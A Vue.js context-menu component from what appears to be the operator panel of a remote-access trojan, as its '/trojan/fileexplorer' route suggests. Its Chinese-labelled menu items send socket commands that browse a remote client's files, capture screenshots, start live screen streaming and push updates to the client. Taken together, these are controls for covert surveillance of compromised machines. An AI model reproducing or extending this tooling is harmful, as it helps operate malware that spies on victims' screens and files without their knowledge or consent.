<template>
  <div
    class="contextmenu-wrapper"
    v-show="contextMenu.show"
    :style="{
      left: `${contextMenu.mousePos.clientX}px`,
      top: `${contextMenu.mousePos.screenY - 70}px`,
    }"
  >
    <template v-for="item in template" :key="item.label">
      <div class="contextmenu-item" @click="itemClicked(item.click)">
        <p>{{ item.label }}</p>
      </div>
    </template>
  </div>
</template>

<script>
export default {
  props: ["template", "mousePos", "show", "contextMenu", "msg"],
  data() {
    return {
      myShow: false,
      myMousePos: {
        screenX: 0,
        screenY: 0,
      },
      myTemplate: [
        {
          label: "显示此客户端详细信息",
          click: () => {
            for (let i = 0; i < window.clientArr.length; i++) {
              if (window.clientArr[i].id === this.msg.id) {
                let str = "";
                for (let item in window.clientArr[i]) {
                  str += `${item}: ${window.clientArr[i][item]}\n`;
                  // console.log(`${item}: ${window.clientArr[i][item]}`);
                }
                alert(str);
                break;
              }
            }
            // alert(1);
          },
        },
        {
          label: "打开文件浏览器",
          click: () => {
            let that = this;
            console.log(this.msg.id);
            window.io.emit("apilistdir", that.msg.id, ".");
            that.$router.push({
              path: `/trojan/fileexplorer`,
              query: {
                id: that.msg.id,
              },
            });
          },
        },
        {
          label: "获取此客户端屏幕截图",
          click: () => {
            window.io.emit("apigetscreenshot", this.msg.id);
          },
        },
        {
          label: "开启此客户端屏幕推流",
          click: () => {
            window.io.emit("apistartvideocapture", this.msg.id);
          },
        },
        // { type: "separator" },
        {
          label: "更新此客户端",
          click: () => {
            window.io.emit("apiupdatethisclient", this.msg.id, "backend");
          },
        },
        // { label: "Menu Item 2", type: "checkbox", checked: true },
      ],
    };
  },
  beforeMount() {},
  methods: {
    itemClicked(callback) {
      callback();
      this.$store.state.contextMenu.show = false;
    },
  },
};
</script>

<style lang="less" scoped>
.contextmenu-wrapper {
  padding: 10px 0 10px 0;
  background-color: white;
  box-shadow: 1px 1px 3px black;
  position: fixed;
  // left: 30px;
  // top: 30px;
}
.contextmenu-item {
  // padding: 0 2px 10px 10px;
  padding: 3px 20px 3px 20px;
  text-align: left;
  p {
    font-size: 0.7rem;
    font-weight: 500;
    cursor: pointer;
  }
  &:hover {
    background-color: rgb(218, 218, 218);
  }
}
</style>
